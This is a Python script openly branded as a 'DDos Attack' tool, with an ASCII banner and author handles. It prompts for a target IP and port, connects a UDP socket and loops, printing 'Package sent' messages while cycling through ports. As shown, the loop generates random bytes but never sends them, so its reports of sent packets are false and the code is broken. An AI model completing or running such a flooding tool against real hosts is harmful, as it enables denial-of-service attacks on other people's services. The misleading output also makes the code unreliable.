def all():
	from time import sleep
	from os import system
	import socket
	import random
	system("clear")
	print("""\033[91m ____  ____                 _   _   _             _
|  _ \|  _ \  ___  ___     / \ | |_| |_ __ _  ___| | __
| | | | | | |/ _ \/ __|   / _ \| __| __/ _` |/ __| |/ /
| |_| | |_| | (_) \__ \  / ___ \ |_| || (_| | (__|   <
|____/|____/ \___/|___/ /_/   \_\__|\__\__,_|\___|_|\_\
	                                      Version 1.0                                            
\033[35m
-----------------------------
| GitHub : Galo-Uatizapi    |
| Instagram : @kypton_usr   |
| YouTube : Cookie $        |
-----------------------------
\033[m""")
	                                                                                        
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	try:
		print("\033[32mEnter target IP \033[m\033[m", end=": ")
		ip = input("\033[36m")
		print("\033[32mEnter target port \033[m\033[m", end=": ")
		port = int(input("\033[36m"))
		sock.connect((ip, port))
	except Exception as e:
		print(f"""\033[31mSomething went wrong!
Reason: \033[33m{e}\033[m""")
		sleep(2)
		all()
	sleep(2)
	try:
		for i in range(1, 100**1000):
			bytes = random._urandom(10000)
			color = ["\033[m", "\033[31m", "\033[32m", "\033[33m", "\033[34m", "\033[35m", "\033[36m", "\033[37m"]
			print(f"DDos-Attack | {random.choice(color)}Package {i} sent to {ip} through the door {port}\033[m")
			port=port+1
	except Exception as e:
		print(f"""------------------------------
\033[31mProgram ending.
Reason: \033[33m{e}\033[m
------------------------------""")
		exit()
	except KeyboardInterrupt:
		print("""------------------------------------
\033[33mProgam ending! check back often!\033[m
------------------------------------""")
		exit()
if __name__=="__main__":
	all()
